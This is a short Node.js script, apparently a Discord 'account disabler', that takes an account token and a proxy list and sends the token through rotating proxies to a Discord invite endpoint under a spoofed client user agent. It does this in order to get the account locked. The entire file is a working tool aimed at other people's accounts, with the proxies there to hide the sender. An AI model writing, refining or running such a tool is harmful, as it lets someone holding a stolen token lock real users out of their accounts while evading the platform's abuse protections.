//Dependencies
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <discord_token> <proxies>")
    process.exit()
}

if(!Fs.existsSync(Self_Args[1])){
    console.log("Invalid proxies.")
    return
}
const proxies = Fs.readFileSync(Self_Args[1], "utf8").replace(/\r/g, "").split("\n")

if(!proxies.length){
    console.log("Proxies data is empty.")
    process.exit()
}

console.log("Disabling the account, please wait this might take a while(Depends in your proxies).")
Disable()
async function Disable(){
    const proxy = proxies[Math.floor(Math.random() * proxies.length)]

    console.log(`Using ${proxy}`)
    Request.post("https://discord.com/api/v9/invites/bug", {
        timeout: 1000,
        headers: {
            "content-type": "application/json",
            authorization: Self_Args[0],
            'useragent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36"
        },
        body: JSON.stringify({}),
        proxy: `http://${proxy}`
    }, function(err, res, body){
        if(err){
            console.log(`${proxy} is died. Retrying...`)
            return Disable()
        }

        if(body.indexOf("You need to verify your account in order to perform this action.") !== -1){
            console.log("Account is already disabled.")
            process.exit()
        }

        if(res.statusCode === 200){
            console.log("Account successfully disabled.")
            process.exit()
        }else{
            console.log("Unable to disable the account, please make sure the discord_token is valid.")
            process.exit()
        }
    })
}